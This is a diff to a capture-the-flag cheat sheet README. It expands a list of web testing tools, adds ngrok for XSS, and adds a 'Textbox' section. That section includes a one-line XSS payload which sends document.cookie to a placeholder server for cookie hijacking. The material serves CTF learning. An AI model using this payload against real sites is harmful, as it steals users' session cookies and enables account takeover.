@@ -1,4 +1,4 @@
-# CTF Candy
+# CTF Candy // ProsD Edition
 
 My goal of this repository is to create a good and up to date cheat sheet for Capture the flag events and computer security.
 
@@ -12,9 +12,10 @@ A good recommendation is try to find stuff that is out of the ordinary.
 
 *Useful tools to begin with*
 
-* ZAP
-* Burpsuite
-* Python with requests lib
+* ZAP with generic reconnaissance
+* Burpsuite for request manipulation
+* Python with requests lib for automation
+* ngrok for XSS
 
 
 #### Injection in GET parameter
@@ -72,7 +73,12 @@ Here you have to manually try to enter some stuff to understand more about the a
     <input type="hidden" name ="debug" />
     ```
 
+#### Textbox
 
+* If the textbox is unfiltered (meaning you can put HTML tags inside it), you may be able to do some cookie hijaking through XSS with some code like this:
+    ```html
+    <img src=x onerror=this.src='http://myserver/?c='+document.cookie>
+    ```
 
 #### Python sandbox escape
 
